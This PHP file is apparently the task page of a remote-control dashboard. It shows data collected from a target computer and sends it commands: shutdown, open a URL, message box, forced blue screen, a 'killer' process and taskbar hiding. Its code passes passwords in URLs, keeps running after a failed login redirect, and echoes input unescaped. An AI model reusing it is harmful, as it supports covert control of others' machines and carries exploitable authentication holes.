<?php
include($_SERVER['DOCUMENT_ROOT']."/core_config.php");
$xxid = "";
$xxpassword = "";
if($_GET["type"] == "watch"){
    if(CheckCookie($connect, $_GET["core_id"], $_GET["core_password"]) == "FALSE"){
        header("Location: https://core.majdev.net/");
    }
    else{
        $xxid = $_GET["core_id"];
        $xxpassword = $_GET["core_password"];
    }
}
else{
    if(CheckCookie($connect, Decrypt($_COOKIE['core_id']), Decrypt($_COOKIE['core_password'])) == "FALSE"){
        header("Location: https://core.majdev.net/");
    }
    else{
        $xxid = Decrypt($_COOKIE['core_id']);
        $xxpassword = Decrypt($_COOKIE['core_password']);
    }
}
$string = FindDevices($connect, $xxid)["device_data"];
$string = base64_decode($string);
$AllData = explode("^*^", $string);
$Computer_Data = explode("!=!", $AllData[0]);
$Computer_Data_Sub1 = explode("*|*", $Computer_Data[0]); 
$Computer_Data_Sub2 = explode("*|*", $Computer_Data[1]);
$SystemName = $Computer_Data_Sub1[0];
$UserName = $Computer_Data_Sub1[1];
$CPUName = $Computer_Data_Sub2[0];
$GPUName = $Computer_Data_Sub2[1];
$RamSize = $Computer_Data_Sub2[2];
$OSInfo = $Computer_Data_Sub2[3];
$IP = $Computer_Data[2];
$Apps = explode("?%%?", $AllData[1]);
if(isset($_POST['command_shutdown'])) { 
   UploadDevicesTask($connect , $xxid , "shutdown");
   unset($_POST);
   unset($_POST['command_shutdown']);
}
if(isset($_POST['command_restart'])) { 
   UploadDevicesTask($connect , $xxid , "restart");
   unset($_POST);
   unset($_POST['command_restart']);
}
if(isset($_POST['command_sleep'])) { 
   UploadDevicesTask($connect , $xxid , "sleep");
   unset($_POST);
   unset($_POST['command_sleep']);
}
if(isset($_POST['command_openurl'])) { 
   $string = "url,";
   $string .= $_POST['command_urltxt'];
   UploadDevicesTask($connect , $xxid , $string);
   unset($_POST);
   unset($_POST['command_openurl']);
   unset($_POST['command_urltxt']);
}
if(isset($_POST['command_openbox'])) { 
   $string = "box,";
   $string .= $_POST['command_messagetxt'];
   UploadDevicesTask($connect , $xxid , $string);
   unset($_POST);
   unset($_POST['command_openbox']);
   unset($_POST['command_messagetxt']);
}
if(isset($_POST['command_bluescreen'])) { 
   UploadDevicesTask($connect , $xxid , "bluescreen");
   unset($_POST);
   unset($_POST['command_bluescreen']);
}
if(isset($_POST['command_killerstart'])) { 
    UploadDevicesTask($connect , $xxid , "killerstart");
    unset($_POST);
    unset($_POST['command_killerstart']);
}
if(isset($_POST['command_killerstop'])) { 
    UploadDevicesTask($connect , $xxid , "killerstop");
    unset($_POST);
    unset($_POST['command_killerstop']);
}
if(isset($_POST['command_killersuspend'])) { 
    UploadDevicesTask($connect , $xxid , "killersuspend");
    unset($_POST);
    unset($_POST['command_killersuspend']);
}
if(isset($_POST['command_killerresume'])) { 
    UploadDevicesTask($connect , $xxid , "killerresume");
    unset($_POST);
    unset($_POST['command_killerresume']);
}
if(isset($_POST['command_showtaskbar'])) { 
    UploadDevicesTask($connect , $xxid , "showtaskbar");
    unset($_POST);
    unset($_POST['command_showtaskbar']);
}
if(isset($_POST['command_hidetaskbar'])) { 
    UploadDevicesTask($connect , $xxid , "hidetaskbar");
    unset($_POST);
    unset($_POST['command_hidetaskbar']);
}
?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Tasks | Core Dashboard</title>
    <link rel="icon" type="image/png" sizes="16x16" href="dashboard-all/plugins/images/favicon.png">
   <link href="dashboard-all/css/style.min.css" rel="stylesheet">
</head>
<body>
    <div class="preloader">
        <div class="lds-ripple">
            <div class="lds-pos"></div>
            <div class="lds-pos"></div>
        </div>
    </div>
    <div id="main-wrapper" data-layout="vertical" data-navbarbg="skin5" data-sidebartype="full"
        data-sidebar-position="absolute" data-header-position="absolute" data-boxed-layout="full">
        <header class="topbar" data-navbarbg="skin5">
            <nav class="navbar top-navbar navbar-expand-md navbar-dark">
                <div class="navbar-header" data-logobg="skin6">
                    <a class="navbar-brand" href="index.php">
                        <b class="logo-icon">
                            <img src="dashboard-all/plugins/images/logo-icon.png" alt="homepage" />
                        </b>
                        <span class="logo-text">
                            <img src="dashboard-all/plugins/images/logo-text.png" alt="homepage" />
                        </span>
                    </a>
                    <a class="nav-toggler waves-effect waves-light text-dark d-block d-md-none"
                        href="javascript:void(0)"><i class="ti-menu ti-close"></i></a>
                </div>
                <div class="navbar-collapse collapse" id="navbarSupportedContent" data-navbarbg="skin5">
                    <ul class="navbar-nav d-none d-md-block d-lg-none">
                        <li class="nav-item">
                            <a class="nav-toggler nav-link waves-effect waves-light text-white"
                                href="javascript:void(0)"><i class="ti-menu ti-close"></i></a>
                        </li>
                    </ul>
                    <ul class="navbar-nav ml-auto d-flex align-items-center">
                        <li>
                           <span class="text-white font-medium">ID: <?php echo $xxid;?></span></a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <aside class="left-sidebar" data-sidebarbg="skin6">
            <div class="scroll-sidebar">
                <nav class="sidebar-nav">
                <ul id="sidebarnav">
                        <li class="sidebar-item"> <a class="sidebar-link waves-effect waves-dark sidebar-link"
                        href="<?php
                                if($_GET["type"] == "watch"){
                                   echo "index.php?type=watch&core_id=$xxid&core_password=$xxpassword";
                                }
                                else{
                                   echo "index.php";
                                }
                            ?>" aria-expanded="false"><i class="fas fa-home"
                                    aria-hidden="true"></i><span class="hide-menu">General</span></a></li>
                        <li class="sidebar-item"> <a class="sidebar-link waves-effect waves-dark sidebar-link"
                        href="<?php
                                if($_GET["type"] == "watch"){
                                   echo "device.php?type=watch&core_id=$xxid&core_password=$xxpassword";
                                }
                                else{
                                   echo "device.php";
                                }
                            ?>" aria-expanded="false">
                                <i class="fas fa-desktop" aria-hidden="true"></i><span class="hide-menu">Device</span></a>
                        </li>
                        <li class="sidebar-item"> <a class="sidebar-link waves-effect waves-dark sidebar-link"
                        href="<?php
                                if($_GET["type"] == "watch"){
                                   echo "running-applications.php?type=watch&core_id=$xxid&core_password=$xxpassword";
                                }
                                else{
                                   echo "running-applications.php";
                                }
                            ?>" aria-expanded="false"><i class="far fa-window-restore"
                                    aria-hidden="true"></i><span class="hide-menu">Running Applications</span></a></li>
                        <li class="sidebar-item"> <a class="sidebar-link waves-effect waves-dark sidebar-link"
                        href="<?php
                                if($_GET["type"] == "watch"){
                                   echo "command-prompt.php?type=watch&core_id=$xxid&core_password=$xxpassword";
                                }
                                else{
                                   echo "command-prompt.php";
                                }
                            ?>" aria-expanded="false"><i class="fas fa-terminal"
                                    aria-hidden="true"></i><span class="hide-menu">Command Prompt</span></a></li>
                        <li class="sidebar-item"> <a class="sidebar-link waves-effect waves-dark sidebar-link"
                        href="<?php
                                if($_GET["type"] == "watch"){
                                   echo "tasks.php?type=watch&core_id=$xxid&core_password=$xxpassword";
                                }
                                else{
                                   echo "tasks.php";
                                }
                            ?>" aria-expanded="false"><i class="fas fa-tasks"
                                    aria-hidden="true"></i><span class="hide-menu">Tasks</span></a></li>
                    </ul>
                </nav>
            </div>
        </aside>
		<div class="page-wrapper">
            <div class="page-breadcrumb bg-white">
                <div class="row align-items-center">
                    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
                        <h4 class="page-title text-uppercase font-medium font-14">Tasks</h4>
                    </div>
                    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
                        <div class="d-md-flex">
                            <ol class="breadcrumb ml-auto">
                                <li></li>
                            </ol>
                          <a class="btn btn-danger" 
                          style="
                          <?php         
                          if(DevicesStatus($connect, $xxid) == "Online"){
                             echo "background: green;border-color: green;";
                          }
                          
                          
                          if(DevicesStatus($connect, $xxid) == "Offline"){
                            echo "background: red;border-color: red;";
                          }  
                          ?>"   
                          >Status:<?php echo DevicesStatus($connect, $xxid);?>
                          </a>
						  <a href="https://core.majdev.net/logout.php" class="btn btn-danger">Logout</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="container-fluid">
            <form method="post"> 
                <div class="row">
                    <div class="col-sm-12">
                        <div class="row justify-content-center">
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Shutdown</h3>
                            <ul class="list-inline two-part d-flex align-items-center mb-0">
                        <?php         
                          if(DevicesStatus($connect, $xxid) == "Online"){
                             echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_shutdown" name="command_shutdown" class="fxt-btn-fill" value="Send Command"/></li>';
                          }
                          
                          
                          if(DevicesStatus($connect, $xxid) == "Offline"){
                            echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_shutdown" name="command_shutdown" class="fxt-btn-fill" value="Send Command"/ disabled></li>';
                          }  
                          ?>  
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Restart</h3>
                            <ul class="list-inline two-part d-flex align-items-center mb-0">
                        <?php         
                          if(DevicesStatus($connect, $xxid) == "Online"){
                             echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_restart" name="command_restart" class="fxt-btn-fill" value="Send Command"/></li>';
                          }
                          
                          
                          if(DevicesStatus($connect, $xxid) == "Offline"){
                            echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_restart" name="command_restart" class="fxt-btn-fill" value="Send Command"/ disabled></li>';
                          }  
                          ?>  
                            </ul>
                        </div>  
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Sleep</h3>
                            <ul class="list-inline two-part d-flex align-items-center mb-0">
                        <?php         
                          if(DevicesStatus($connect, $xxid) == "Online"){
                             echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_sleep" name="command_sleep" class="fxt-btn-fill" value="Send Command"/></li>';
                          }
                          
                          
                          if(DevicesStatus($connect, $xxid) == "Offline"){
                            echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_sleep" name="command_sleep" class="fxt-btn-fill" value="Send Command"/ disabled></li>';
                          }  
                          ?>  
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-sm-12">
                        <div class="row justify-content-center">
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">OPEN URL</h3>
                              <textarea id="command_urltxt" name="command_urltxt" class="form-control p-0 border-0" style="margin-top: 0px; height: 98px; background: rgb(237, 241, 245); margin-bottom: 10px;resize: none;"></textarea>
                            <ul class="list-inline two-part d-flex align-items-center mb-0">
                            <?php         
                              if(DevicesStatus($connect, $xxid) == "Online"){
                               echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_openurl" name="command_openurl" class="fxt-btn-fill" value="Send Command"/></li>';
                              }
                          
                          
                              if(DevicesStatus($connect, $xxid) == "Offline"){
                                echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_openurl" name="command_openurl" class="fxt-btn-fill" value="Send Command"/ disabled></li>';
                              }  
                          ?>  
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">MESSAGEBOX</h3>
                             <textarea id="command_txt" name="command_messagetxt" class="form-control p-0 border-0" style="margin-top: 0px; height: 93px; background: rgb(237, 241, 245); margin-bottom: 10px;resize: none;"></textarea>
                            <ul class="list-inline two-part d-flex align-items-center mb-0">
                            <?php         
                              if(DevicesStatus($connect, $xxid) == "Online"){
                               echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_openbox" name="command_openbox" class="fxt-btn-fill" value="Send Command"/></li>';
                              }
                          
                          
                              if(DevicesStatus($connect, $xxid) == "Offline"){
                                echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_openbox" name="command_openbox" class="fxt-btn-fill" value="Send Command"/ disabled></li>';
                              }  
                            ?>  
                            </ul>
                        </div>  
                    </div>
                    <div class="col-lg-4 col-sm-6 col-xs-12">
                    <div class="white-box analytics-info">
                            <h3 class="box-title">BLUE SCREEN</h3>
                            <ul class="list-inline two-part d-flex align-items-center mb-0">
                            <?php         
                              if(DevicesStatus($connect, $xxid) == "Online"){
                               echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_bluescreen" name="command_bluescreen" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Send Command"/></li>';
                              }
                          
                          
                              if(DevicesStatus($connect, $xxid) == "Offline"){
                                echo '<li class="ml-auto"><input class="btn btn-success" type="submit" id="command_bluescreen" name="command_bluescreen" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Send Command"/ disabled></li>';
                              }  
                            ?>  
                            </ul>
                        </div>
                    </div>
                    <div class="col-sm-12">
                    <div class="white-box analytics-info">
                            <h3 class="box-title">Killer</h3>
                            <ul class="list-inline two-part d-flex align-items-center mb-0">
                            <?php         
                              if(DevicesStatus($connect, $xxid) == "Online"){
                               echo '<input class="btn btn-success" type="submit" id="command_killerstart" name="command_killerstart" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Start"/>';
                              }
                              if(DevicesStatus($connect, $xxid) == "Offline"){
                                echo '<input class="btn btn-success" type="submit" id="command_killerstart" name="command_killerstart" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Start"/ disabled>';
                              }  
                            ?> 
                            &nbsp; 
                            <?php         
                              if(DevicesStatus($connect, $xxid) == "Online"){
                               echo '<input class="btn btn-success" type="submit" id="command_killerstop" name="command_killerstop" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Stop"/>';
                              }
                              if(DevicesStatus($connect, $xxid) == "Offline"){
                                echo '<input class="btn btn-success" type="submit" id="command_killerstop" name="command_killerstop" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Stop"/ disabled>';
                              }  
                            ?>
                            &nbsp; 
                            <?php         
                              if(DevicesStatus($connect, $xxid) == "Online"){
                               echo '<input class="btn btn-success" type="submit" id="command_killersuspend" name="command_killersuspend" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Suspend"/>';
                              }
                              if(DevicesStatus($connect, $xxid) == "Offline"){
                                echo '<input class="btn btn-success" type="submit" id="command_killersuspend" name="command_killersuspend" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Suspend"/ disabled>';
                              }  
                            ?>
                            &nbsp; 
                            <?php         
                              if(DevicesStatus($connect, $xxid) == "Online"){
                               echo '<input class="btn btn-success" type="submit" id="command_killerresume" name="command_killerresume" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Resume"/>';
                              }                 
                              if(DevicesStatus($connect, $xxid) == "Offline"){
                                echo '<input class="btn btn-success" type="submit" id="command_killerresume" name="command_killerresume" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Resume"/ disabled>';
                              }  
                            ?>
							&nbsp; 
                            <?php         
                              if(DevicesStatus($connect, $xxid) == "Online"){
                               echo '<input class="btn btn-success" type="submit" id="command_showtaskbar" name="command_showtaskbar" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Show Taskbar"/>';
                              }                 
                              if(DevicesStatus($connect, $xxid) == "Offline"){
                                echo '<input class="btn btn-success" type="submit" id="command_showtaskbar" name="command_showtaskbar" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Show Taskbar"/ disabled>';
                              }  
                            ?>
							&nbsp; 
                            <?php         
                              if(DevicesStatus($connect, $xxid) == "Online"){
                               echo '<input class="btn btn-success" type="submit" id="command_hidetaskbar" name="command_hidetaskbar" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Hide Taskbar"/>';
                              }                 
                              if(DevicesStatus($connect, $xxid) == "Offline"){
                                echo '<input class="btn btn-success" type="submit" id="command_hidetaskbar" name="command_hidetaskbar" class="fxt-btn-fill" style="margin-bottom: 100px;" value="Hide Taskbar"/ disabled>';
                              }  
                            ?>
                            </ul>
                        </div>
                    </div>
                    </div>
                </div>
                    </div>
                </div>
                    </div>
                </div>
                </form>
            </div> 
            <footer class="footer text-center">Developer by Majdev</footer>
        </div>
    <script src="dashboard-all/plugins/bower_components/jquery/dist/jquery.min.js"></script>
    <script src="dashboard-all/plugins/bower_components/popper.dashboard-all/js/dist/umd/popper.min.js"></script>
    <script src="dashboard-all/bootstrap/dist/dashboard-all/js/bootstrap.min.js"></script>
    <script src="dashboard-all/js/app-style-switcher.js"></script>
    <script src="dashboard-all/js/waves.js"></script>
    <script src="dashboard-all/js/sidebarmenu.js"></script>
    <script src="dashboard-all/js/custom.js"></script>
</body>
</html>